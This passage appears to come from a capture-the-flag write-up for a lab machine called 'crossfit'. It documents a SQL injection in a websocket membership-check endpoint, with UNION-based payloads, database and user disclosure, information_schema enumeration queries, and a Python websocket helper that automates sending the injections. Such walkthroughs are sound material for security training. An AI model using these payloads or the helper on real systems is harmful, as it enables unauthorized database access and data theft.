  {<span style="color:#f1fa8c">&#34;message&#34;</span>:<span style="color:#f1fa8c">&#34;available&#34;</span>,<span style="color:#f1fa8c">&#34;params&#34;</span>:<span style="color:#f1fa8c">&#34;1&#34;</span>,<span style="color:#f1fa8c">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;a434829e9a694db99564774e93965fb78c9377d81565217de645da1dc1365761&#34;</span>}
<span style="color:#ff79c6">&lt;</span> {<span style="color:#f1fa8c">&#34;status&#34;</span>:<span style="color:#f1fa8c">&#34;200&#34;</span>,<span style="color:#f1fa8c">&#34;message&#34;</span>:<span style="color:#f1fa8c">&#34;Good news! This membership plan is available.&#34;</span>,<span style="color:#f1fa8c">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;9d43ccbf1b19184e29c4799b0c6c04928a0577c0f730f56a3e2fbb44fcd971f0&#34;</span>,<span style="color:#f1fa8c">&#34;debug&#34;</span>:<span style="color:#f1fa8c">&#34;[id: 1, name: 1-month]&#34;</span>}
</code></pre></td></tr></table>
</div>
</div><h3 id="discover-sqli">discover SQLI</h3>
<p>attempt SQLI by replacing the params with <code>' or 1=1 limit 1</code> returns the same string in the field <code>debug.id</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
  <span style="color:#ff79c6">&#34;message&#34;</span>: <span style="color:#f1fa8c">&#34;available&#34;</span>,
  <span style="color:#ff79c6">&#34;params&#34;</span>: <span style="color:#f1fa8c">&#34;&#39; or 1=1 limit 1&#34;</span>,
  <span style="color:#ff79c6">&#34;token&#34;</span>: <span style="color:#f1fa8c">&#34;9d43ccbf1b19184e29c4799b0c6c04928a0577c0f730f56a3e2fbb44fcd971f0&#34;</span>
} &lt;
  {
    <span style="color:#ff79c6">&#34;status&#34;</span>: <span style="color:#f1fa8c">&#34;200&#34;</span>,
    <span style="color:#ff79c6">&#34;message&#34;</span>: <span style="color:#f1fa8c">&#34;I&#39;m sorry, this membership plan iscurrently unavailable.&#34;</span>,
    <span style="color:#ff79c6">&#34;token&#34;</span>: <span style="color:#f1fa8c">&#34;b62dc7783165d5ae340b17c5917993b811687ad5c68c350fff33b4f650671e33&#34;</span>,
    <span style="color:#ff79c6">&#34;debug&#34;</span>: <span style="color:#f1fa8c">&#34;[id: &#39; or 1=1 limit 1]&#34;</span>
  }
</code></pre></td></tr></table>
</div>
</div><p>Therefore we can deduct the SQL query is something like:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#ff79c6">select</span> id, name <span style="color:#ff79c6">from</span> whatever_table <span style="color:#ff79c6">where</span> id<span style="color:#ff79c6">=</span>{params};
</code></pre></td></tr></table>
</div>
</div><p>The <code>id</code> column is likely to be an integer and therefore the single or double quote does not make much sense for SQLI.</p>
<p>Instead we can try <code>9999 or 1=1 limit 1</code>, and it works great, so we can proceed to a UNION SQLI attack:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">  {<span style="color:#ff79c6">&#34;message&#34;</span>:<span style="color:#f1fa8c">&#34;available&#34;</span>,<span style="color:#ff79c6">&#34;params&#34;</span>:<span style="color:#f1fa8c">&#34;3 or 1=1 limit 1&#34;</span>,<span style="color:#ff79c6">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;b62dc7783165d5ae340b17c5917993b811687ad5c68c350fff33b4f650671e33&#34;</span>}
&lt; {<span style="color:#ff79c6">&#34;status&#34;</span>:<span style="color:#f1fa8c">&#34;200&#34;</span>,<span style="color:#ff79c6">&#34;message&#34;</span>:<span style="color:#f1fa8c">&#34;Good news! This membership plan is available.&#34;</span>,<span style="color:#ff79c6">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;08d129b5e8977161ca8713a3bdfd73f433c4aeb1442f2aa89ec7542fd108d297&#34;</span>,<span style="color:#ff79c6">&#34;debug&#34;</span>:<span style="color:#f1fa8c">&#34;[id: 1, name: 1-month]&#34;</span>}
  {<span style="color:#ff79c6">&#34;message&#34;</span>:<span style="color:#f1fa8c">&#34;available&#34;</span>,<span style="color:#ff79c6">&#34;params&#34;</span>:<span style="color:#f1fa8c">&#34;100 or 1=1 limit 1 offset 2&#34;</span>,<span style="color:#ff79c6">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;08d129b5e8977161ca8713a3bdfd73f433c4aeb1442f2aa89ec7542fd108d297&#34;</span>}
&lt; {<span style="color:#ff79c6">&#34;status&#34;</span>:<span style="color:#f1fa8c">&#34;200&#34;</span>,<span style="color:#ff79c6">&#34;message&#34;</span>:<span style="color:#f1fa8c">&#34;Good news! This membership plan is available.&#34;</span>,<span style="color:#ff79c6">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;370ecf83183da1e0490e118a12b959c0fe72cf89e2a9335ed3c962a8c664e29d&#34;</span>,<span style="color:#ff79c6">&#34;debug&#34;</span>:<span style="color:#f1fa8c">&#34;[id: 3, name: 6-months]&#34;</span>}
</code></pre></td></tr></table>
</div>
</div><h3 id="exploit-union-sqli">Exploit Union-SQLI</h3>
<p>We can guess the number of columns is 2 with the below. Hence, columns are <code>id</code> and <code>name</code> as per the debug information:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">  {<span style="color:#ff79c6">&#34;message&#34;</span>:<span style="color:#f1fa8c">&#34;available&#34;</span>,<span style="color:#ff79c6">&#34;params&#34;</span>:<span style="color:#f1fa8c">&#34;100 union select 1,2&#34;</span>,<span style="color:#ff79c6">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;16685c5cc568ef95a2ab1215088fd03ea113d232140f7488b45bf97023f8c494&#34;</span>}
&lt; {<span style="color:#ff79c6">&#34;status&#34;</span>:<span style="color:#f1fa8c">&#34;200&#34;</span>,<span style="color:#ff79c6">&#34;message&#34;</span>:<span style="color:#f1fa8c">&#34;Good news! This membership plan is available.&#34;</span>,<span style="color:#ff79c6">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;b83a66d29c045e515552b1aa627ded9941692cea316d910ef0aad6884ffa2f32&#34;</span>,<span style="color:#ff79c6">&#34;debug&#34;</span>:<span style="color:#f1fa8c">&#34;[id: 1, name: 2]&#34;</span>}
  {<span style="color:#ff79c6">&#34;message&#34;</span>:<span style="color:#f1fa8c">&#34;available&#34;</span>,<span style="color:#ff79c6">&#34;params&#34;</span>:<span style="color:#f1fa8c">&#34;100 union select 2,3&#34;</span>,<span style="color:#ff79c6">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;b83a66d29c045e515552b1aa627ded9941692cea316d910ef0aad6884ffa2f32&#34;</span>}
&lt; {<span style="color:#ff79c6">&#34;status&#34;</span>:<span style="color:#f1fa8c">&#34;200&#34;</span>,<span style="color:#ff79c6">&#34;message&#34;</span>:<span style="color:#f1fa8c">&#34;Good news! This membership plan is available.&#34;</span>,<span style="color:#ff79c6">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;e8dfbf19f6a42045a5c19bd7e80b20fabf860a02ca180673d79b7ad5d571828c&#34;</span>,<span style="color:#ff79c6">&#34;debug&#34;</span>:<span style="color:#f1fa8c">&#34;[id: 2, name: 3]&#34;</span>}
  {<span style="color:#ff79c6">&#34;message&#34;</span>:<span style="color:#f1fa8c">&#34;available&#34;</span>,<span style="color:#ff79c6">&#34;params&#34;</span>:<span style="color:#f1fa8c">&#34;100 union select 1,2,3&#34;</span>,<span style="color:#ff79c6">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;e8dfbf19f6a42045a5c19bd7e80b20fabf860a02ca180673d79b7ad5d571828c&#34;</span>}
&gt; [NO RESPONSE]
</code></pre></td></tr></table>
</div>
</div><p>We can try to guess database() and user():</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
  <span style="color:#ff79c6">&#34;message&#34;</span>: <span style="color:#f1fa8c">&#34;available&#34;</span>,
  <span style="color:#ff79c6">&#34;params&#34;</span>: <span style="color:#f1fa8c">&#34;100 union select database(), user()&#34;</span>,
  <span style="color:#ff79c6">&#34;token&#34;</span>: <span style="color:#f1fa8c">&#34;237dfe579a837ded7a316963054fa38863ad80fca7d14660a44a2b9186f79961&#34;</span>
} &lt;
  {
    <span style="color:#ff79c6">&#34;status&#34;</span>: <span style="color:#f1fa8c">&#34;200&#34;</span>,
    <span style="color:#ff79c6">&#34;message&#34;</span>: <span style="color:#f1fa8c">&#34;Good news! This membership plan is available.&#34;</span>,
    <span style="color:#ff79c6">&#34;token&#34;</span>: <span style="color:#f1fa8c">&#34;ca91edc57250520a6adbb410936e17c27cfa7368cd46a73f3c49f82264e5efbe&#34;</span>,
    <span style="color:#ff79c6">&#34;debug&#34;</span>: <span style="color:#f1fa8c">&#34;[id: crossfit, name: crossfit_user@localhost]&#34;</span>
  }
</code></pre></td></tr></table>
</div>
</div><h3 id="sqli-helper">SQLI Helper</h3>
<p>We can build a Helper to avoid having to copy-paste the token all the time:</p>
<h4 id="python-loop-with-cmd-module">python loop with cmd module</h4>
<p>We can use two modules:</p>
<ul>
<li><code>cmd</code> to create a terminal-like loop</li>
<li><code>websocket-client</code> to send / receive data with <code>python3 -m pip install websocket-client</code></li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python3</span>

<span style="color:#ff79c6">import</span> json
<span style="color:#ff79c6">import</span> websocket
<span style="color:#ff79c6">from</span> cmd <span style="color:#ff79c6">import</span> Cmd


<span style="color:#ff79c6">class</span> <span style="color:#50fa7b">Term</span>(Cmd):
    prompt <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;injection&gt; &#34;</span>

    <span style="color:#ff79c6">def</span> __init__(self):
        self<span style="color:#ff79c6">.</span>ws <span style="color:#ff79c6">=</span> websocket<span style="color:#ff79c6">.</span>create_connection(<span style="color:#f1fa8c">&#34;ws://gym.crossfit.htb/ws/&#34;</span>)
        data <span style="color:#ff79c6">=</span> json<span style="color:#ff79c6">.</span>loads(self<span style="color:#ff79c6">.</span>ws<span style="color:#ff79c6">.</span>recv())
        self<span style="color:#ff79c6">.</span>token <span style="color:#ff79c6">=</span> data[<span style="color:#f1fa8c">&#34;token&#34;</span>]
        <span style="color:#8be9fd;font-style:italic">super</span>()<span style="color:#ff79c6">.</span>__init__()

    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">default</span>(self, args):
        self<span style="color:#ff79c6">.</span>ws<span style="color:#ff79c6">.</span>send(
            <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{{</span><span style="color:#f1fa8c">&#34;message&#34;:&#34;available&#34;,&#34;params&#34;:&#34;</span><span style="color:#f1fa8c">{</span>params<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;, &#34;token&#34;: &#34;</span><span style="color:#f1fa8c">{</span>self<span style="color:#ff79c6">.</span>token<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">}}</span><span style="color:#f1fa8c">&#39;</span>
        )
        data <span style="color:#ff79c6">=</span> json<span style="color:#ff79c6">.</span>loads(self<span style="color:#ff79c6">.</span>ws<span style="color:#ff79c6">.</span>recv())
        self<span style="color:#ff79c6">.</span>token <span style="color:#ff79c6">=</span> data[<span style="color:#f1fa8c">&#34;token&#34;</span>]
        <span style="color:#8be9fd;font-style:italic">print</span>(data[<span style="color:#f1fa8c">&#34;debug&#34;</span>])

    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">do_exit</span>(self, args):
        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>


term <span style="color:#ff79c6">=</span> Term()
term<span style="color:#ff79c6">.</span>cmdloop()
</code></pre></td></tr></table>
</div>
</div><table>
<thead>
<tr>
<th>what</th>
<th>cmd</th>
</tr>
</thead>
<tbody>
<tr>
<td>list dbs</td>
<td>999 union select group_concat(schema_name),2 from information_schema.schemata</td>
</tr>
<tr>
<td>list tables</td>
<td>999 union select group_concat(table_name),2 from information_schema.tables where table_schema='{db_name}'</td>
</tr>
</tbody>
</table>
<p>Because there is some timeout resulting in token expiration, we have to reconnect upon <code>websocket._exceptions.WebSocketConnectionClosedException</code> or <code>BrokenPipeError</code>: |</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python3</span>

<span style="color:#ff79c6">import</span> json
<span style="color:#ff79c6">import</span> websocket
<span style="color:#ff79c6">from</span> cmd <span style="color:#ff79c6">import</span> Cmd

<span style="color:#ff79c6">class</span> <span style="color:#50fa7b">Term</span>(Cmd):
    prompt <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;injection&gt; &#34;</span>

    <span style="color:#ff79c6">def</span> __init__(self):
        self<span style="color:#ff79c6">.</span>connect()
        <span style="color:#8be9fd;font-style:italic">super</span>()<span style="color:#ff79c6">.</span>__init__()

    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">connect</span>(self):
        self<span style="color:#ff79c6">.</span>ws <span style="color:#ff79c6">=</span> websocket<span style="color:#ff79c6">.</span>create_connection(<span style="color:#f1fa8c">&#34;ws://gym.crossfit.htb/ws/&#34;</span>)
        data <span style="color:#ff79c6">=</span> json<span style="color:#ff79c6">.</span>loads(self<span style="color:#ff79c6">.</span>ws<span style="color:#ff79c6">.</span>recv())
        self<span style="color:#ff79c6">.</span>token <span style="color:#ff79c6">=</span> data[<span style="color:#f1fa8c">&#34;token&#34;</span>]

    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">send_ws</span>(self, args):
        self<span style="color:#ff79c6">.</span>ws<span style="color:#ff79c6">.</span>send(
            <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{{</span><span style="color:#f1fa8c">&#34;message&#34;:&#34;available&#34;,&#34;params&#34;:&#34;</span><span style="color:#f1fa8c">{</span>args<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;, &#34;token&#34;: &#34;</span><span style="color:#f1fa8c">{</span>self<span style="color:#ff79c6">.</span>token<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">}}</span><span style="color:#f1fa8c">&#39;</span>
        )
        data <span style="color:#ff79c6">=</span> json<span style="color:#ff79c6">.</span>loads(self<span style="color:#ff79c6">.</span>ws<span style="color:#ff79c6">.</span>recv())
        self<span style="color:#ff79c6">.</span>token <span style="color:#ff79c6">=</span> data[<span style="color:#f1fa8c">&#34;token&#34;</span>]
        <span style="color:#ff79c6">return</span> data[<span style="color:#f1fa8c">&#34;debug&#34;</span>]

    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">send</span>(self, args):
        <span style="color:#ff79c6">try</span>:
            <span style="color:#ff79c6">return</span> self<span style="color:#ff79c6">.</span>send_ws(args)
        <span style="color:#ff79c6">except</span> (websocket<span style="color:#ff79c6">.</span>_exceptions<span style="color:#ff79c6">.</span>WebSocketConnectionClosedException, BrokenPipeError):
            self<span style="color:#ff79c6">.</span>connect()
            <span style="color:#ff79c6">return</span> self<span style="color:#ff79c6">.</span>send_ws(args)

    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">do_exit</span>(self, args):
        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>

